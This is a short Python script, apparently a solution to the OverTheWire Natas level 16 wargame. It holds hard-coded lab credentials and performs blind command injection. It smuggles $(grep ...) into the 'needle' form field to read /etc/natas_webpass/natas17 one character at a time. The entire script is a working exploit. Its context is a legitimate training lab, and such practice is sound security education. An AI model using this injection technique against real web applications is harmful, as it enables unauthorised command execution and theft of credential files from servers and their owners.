import requests
import re
from string import *

characters = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"
print(characters)


logar = ["natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"]
url = "http://%s.natas.labs.overthewire.org/"%logar[0]
session = requests.Session()

vi_a_senha = list()
while(len(vi_a_senha) <=32):
    for ch in characters:
        print("Testando "+ch+"==> "+"".join(vi_a_senha))
        r = session.post(url, data={"needle":"anythings$(grep ^"+"".join(vi_a_senha)+ch+ " /etc/natas_webpass/natas17)"} ,auth=(logar[0],logar[1]), timeout=10)
        contento = r.text
        if "anythings" not in r.text:
            print(contento)
            vi_a_senha.append(ch)
